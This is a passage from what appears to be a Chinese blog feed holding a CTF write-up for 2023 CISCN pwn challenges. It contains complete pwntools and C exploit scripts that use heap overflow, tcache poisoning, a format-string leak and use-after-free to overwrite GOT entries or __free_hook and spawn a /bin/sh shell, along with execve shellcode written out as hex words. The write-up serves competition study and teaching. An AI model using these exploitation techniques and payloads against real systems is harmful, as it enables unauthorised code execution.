class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">content</span>):<br>    p.sendafter(<span class="hljs-string">&#x27;HTTP_Parser&gt; &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /create HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Size: <span class="hljs-subst">&#123;size&#125;</span></span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(<span class="hljs-number">0x80</span>)&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header + <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x80</span><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, offset, length, content</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /edit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;length&#125;</span></span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span></span><br><span class="hljs-string">Offset: <span class="hljs-subst">&#123;offset&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    payload = header.encode() + content<br><br>    menu(payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /delete HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip</span><br><span class="hljs-string">Idx: <span class="hljs-subst">&#123;index&#125;</span>\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">quit</span>():<br>    header = <span class="hljs-string">f&#x27;&#x27;&#x27;POST /quit HTTP/1.0</span><br><span class="hljs-string">Connection: Keep-Alive</span><br><span class="hljs-string">Accept-Encoding: gzip\n</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    menu(header)<br><br><br>command = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">dir ~/tools/glibc-source/glibc-2.31/elf/</span><br><span class="hljs-string">b *0x4021CA</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># dbg(command)</span><br><br><span class="hljs-comment"># quit()</span><br><br>bitmask_offset = <span class="hljs-number">0xb88</span><br>bucket_offset = <span class="hljs-number">0xcb0</span><br>hasharr_offset = <span class="hljs-number">0x1d7c</span><br>exit_sym_offset = <span class="hljs-number">0x4d20</span><br><br>bitmask_word = <span class="hljs-number">0xf000028c0200130e</span><br>bucket = <span class="hljs-number">0x86</span><br>hasharr = <span class="hljs-number">0x7c967e3e7c93f2a0</span><br>exit_sym = <span class="hljs-number">0x000f001200002efb</span><br><br>st_value = <span class="hljs-number">0x52290</span>  <span class="hljs-comment"># system offset libc base</span><br><br>add(<span class="hljs-number">0x200000</span>)<br>edit(<span class="hljs-number">0</span>, -<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x02\x10\x21&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0x211002</span>)<br><br>vmmap_offset_libc = <span class="hljs-number">0x201ff0</span><br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset, <span class="hljs-number">2</span>, p16(bitmask_word &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">24</span> &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">40</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bitmask_offset + <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, p16(bitmask_word &gt;&gt; <span class="hljs-number">56</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + bucket_offset, <span class="hljs-number">1</span>, p8(bucket))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + hasharr_offset, <span class="hljs-number">8</span>, p64(hasharr))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, p16(exit_sym &amp; <span class="hljs-number">0xffff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">32</span> &amp; <span class="hljs-number">0xff</span>))<br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset - <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, p8(exit_sym &gt;&gt; <span class="hljs-number">48</span> &amp; <span class="hljs-number">0xff</span>))<br><br>edit(<span class="hljs-number">0</span>, vmmap_offset_libc + exit_sym_offset, <span class="hljs-number">3</span>, p32(st_value)[:-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># dbg()</span><br><br>quit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708141239875.png" alt="image-20230708141239875"></p><h2 id="pwn-lvm"><a href="#pwn-lvm" class="headerlink" title="pwn-lvm"></a>pwn-lvm</h2><p>这道题比赛时0解。说实话有点无语，比赛时笔者把断点下在了<strong>sub_8050</strong>函数开头，就是进入不了关键逻辑。没单步几步就退了，以为有什么特殊的过滤。结果复现时，笔者又尝试把断点直接下在了关键逻辑处，发现可以直接进入关键逻辑。还是太菜了。</p><p>检查保护。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143525371.png" alt="image-20230708143525371"></p><p>几乎什么保护都没开。</p><p>程序也是一个常规的菜单堆。</p><p>Edit函数被没有检查offset的大小，存在堆溢出。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143704111.png" alt="image-20230708143704111"></p><p>Alloc函数分配了一段可读可写可执行的区域。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143804086.png" alt="image-20230708143804086"></p><p>EditAlloc函数对我们分配的区域进行写。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708143907984.png" alt="image-20230708143907984"></p><p>大致利用思路就是，</p><ol><li>在我们分配的可读可写可执行区域写入shellcode。</li><li>通过堆溢出覆盖tcache的next字段，实现任意地址分配。</li><li>覆盖free_got为shellcode。</li></ol><p>说实话，笔者对这个调用链也有点迷。多次调试发现<strong>exit</strong>退出时，执行了<strong>opt-10</strong>的<strong>free_got</strong>，也就是我们的shellcode。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708144609923.png" alt="image-20230708144609923"></p><p>最终wp如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//clang-10 -emit-llvm -S wp.c -o wp.ll</span><br><span class="hljs-comment">//./opt-10 -load ./LLVMHello.so -Hello ./wp.ll</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Add</span><span class="hljs-params">(<span class="hljs-type">int</span> size)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Edit</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> data)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Del</span><span class="hljs-params">(<span class="hljs-type">int</span> idx)</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Alloc</span><span class="hljs-params">()</span>&#123;&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">EditAlloc</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> offset)</span>&#123;&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">l1s00t</span><span class="hljs-params">()</span><br>&#123;<br>Alloc();<br><br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br>Add(<span class="hljs-number">0x1000</span>);<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xb848686a</span>);  <br>    Edit(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6e69622f</span>);  <br>    Edit(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x732f2f2f</span>);  <br>    Edit(<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0xe7894850</span>);  <br>    Edit(<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01697268</span>);  <br>    Edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x24348101</span>);  <br>    Edit(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01010101</span>);  <br>    Edit(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6a56f631</span>);  <br>    Edit(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x01485e08</span>);  <br>    Edit(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x894856e6</span>);  <br>    Edit(<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x6ad231e6</span>);  <br>    Edit(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x050f583b</span>);  <br><br>EditAlloc(<span class="hljs-number">0</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">0</span>);<br>EditAlloc(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">1</span>);<br>EditAlloc(<span class="hljs-number">2</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">2</span>);<br>EditAlloc(<span class="hljs-number">3</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">3</span>);<br>EditAlloc(<span class="hljs-number">4</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">4</span>);<br>EditAlloc(<span class="hljs-number">5</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">5</span>);<br>EditAlloc(<span class="hljs-number">6</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">6</span>);<br>EditAlloc(<span class="hljs-number">7</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">7</span>);<br>EditAlloc(<span class="hljs-number">8</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">8</span>);<br>EditAlloc(<span class="hljs-number">9</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">9</span>);<br>EditAlloc(<span class="hljs-number">10</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">10</span>);<br>EditAlloc(<span class="hljs-number">11</span>, <span class="hljs-number">0x4</span> * <span class="hljs-number">11</span>);<br><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 12</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 13</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 14</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 15</span><br><br>Del(<span class="hljs-number">14</span>);<br>Del(<span class="hljs-number">13</span>);<br><br>Edit(<span class="hljs-number">12</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x78B108</span>);<br><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 13</span><br>Add(<span class="hljs-number">0x140</span>);<span class="hljs-comment">// 14</span><br><br>Edit(<span class="hljs-number">14</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x10000</span>);<br>Edit(<span class="hljs-number">14</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708144514375.png" alt="image-20230708144514375"></p><p>Tips：获取shellcode的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>shellcode = asm(shellcraft.sh())<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(shellcode) % <span class="hljs-number">4</span>:<br>    shellcode += <span class="hljs-built_in">len</span>(shellcode) % <span class="hljs-number">4</span> * <span class="hljs-string">b&#x27;\x90&#x27;</span><br><br>res = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(shellcode), <span class="hljs-number">0x4</span>):<br>    res.append(shellcode[i:i + <span class="hljs-number">4</span>])<br><br><br><span class="hljs-keyword">for</span> code <span class="hljs-keyword">in</span> res:<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u32(code)))<br><br></code></pre></td></tr></table></figure><h2 id="awd"><a href="#awd" class="headerlink" title="awd"></a>awd</h2><p>这道题比赛时应该有挺多师傅写出来了。一开始我只顾着逆结构体去了，也没有修漏洞，结果我们pwn靶机被打了，然后笔者直接上了沙盒才避免进一步掉分。最后只发现了一个uaf漏洞，太紧张了也没有利用起来。最那啥的是，当时竟然没有看到格式化字符串漏洞，还是太菜了。</p><p>检查保护。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708151938597.png" alt="image-20230708151938597"></p><p>保护全开。</p><p>笔者逆出来的结构体大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mycmd</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int32_t</span> is_file;<br>  <span class="hljs-type">char</span> name[<span class="hljs-number">16</span>];<br>  <span class="hljs-type">char</span> *content;<br>  <span class="hljs-type">char</span> *prev;<br>  <span class="hljs-type">char</span> *next;<br>  <span class="hljs-type">char</span> *prev_dir;<br>  <span class="hljs-type">char</span> *head;<br>&#125;;<br></code></pre></td></tr></table></figure><p>rm函数存在uaf漏洞</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152134821.png" alt="image-20230708152134821"></p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152201071.png" alt="image-20230708152201071"></p><p>删除content时，没有清空。同时，删除管理头时，仅仅删除了前后指针。</p><p>echo函数存在格式化字符串漏洞。</p><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152339949.png" alt="image-20230708152339949"></p><p>这两个漏洞都算是比较好利用的，既可以结合使用，也可以单独利用。</p><p>最终wp(UAF)如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>elf = ELF(fn)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    p = process(fn)<br><span class="hljs-keyword">else</span>:<br>    p = remote()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">s=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-keyword">if</span> debug:<br>        gdb.attach(p, s)<br>        pause()<br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;$ &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br>attack(<span class="hljs-string">&quot;touch l1s00t&quot;</span>)<br><br>payload = <span class="hljs-string">&#x27;%11$p %15$p %7$p&#x27;</span><br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> l1s00t&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">&#x27;0x&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0xa036e</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>codebase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x2820</span><br>lg(<span class="hljs-string">&#x27;codebase&#x27;</span>, codebase)<br><br>heapbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x510</span><br>lg(<span class="hljs-string">&#x27;heapbase&#x27;</span>, heapbase)<br><br><span class="hljs-comment"># test uaf</span><br><span class="hljs-comment"># attack(&quot;mkdir l1&quot;)</span><br><span class="hljs-comment"># attack(&quot;cd l1&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f1&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f2&quot;)</span><br><span class="hljs-comment"># attack(&quot;touch f3&quot;)</span><br><br><span class="hljs-comment"># attack(&quot;echo l1s00t &gt; f1&quot;)</span><br><span class="hljs-comment"># attack(&quot;rm f1&quot;)</span><br><br><span class="hljs-comment"># attack(&quot;touch f4&quot;)</span><br><span class="hljs-comment"># attack(&quot;rm f4&quot;)</span><br><br>attack(<span class="hljs-string">&quot;mkdir l2&quot;</span>)<br>attack(<span class="hljs-string">&quot;cd l2&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    attack(<span class="hljs-string">f&quot;touch f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br>    attack(<span class="hljs-string">f&quot;echo aaaaaaaa &gt; f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">f&quot;rm f<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;rm f7&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;touch f10&quot;</span>)<br><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>payload = p64(free_hook - <span class="hljs-number">8</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:<span class="hljs-number">6</span>].encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>payload = payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> &gt; f10&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    attack(<span class="hljs-string">f&quot;touch f<span class="hljs-subst">&#123;<span class="hljs-number">11</span> + i&#125;</span>&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;cat f17&quot;</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1ecbe0</span><br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>attack(<span class="hljs-string">&quot;touch f20&quot;</span>)<br>attack(<span class="hljs-string">&quot;echo ccccccc &gt; f20&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;touch f21&quot;</span>)<br><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = <span class="hljs-string">b&quot;/bin/sh;&quot;</span> + p64(system).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)[:<span class="hljs-number">6</span>].encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>payload = payload.decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>attack(<span class="hljs-string">f&quot;echo <span class="hljs-subst">&#123;payload&#125;</span> &gt; f21&quot;</span>)<br><br>attack(<span class="hljs-string">&quot;rm f21&quot;</span>)<br><br><span class="hljs-comment"># dbg()</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><p><img src="/img/2023-ciscn-%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA-pwn-wp/image-20230708152603676.png" alt="image-20230708152603676"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CNVD-2018-01084-Dlink远程命令执行漏洞</title>
    <link href="/2023/07/03/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/07/03/CNVD-2018-01084-Dlink%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    
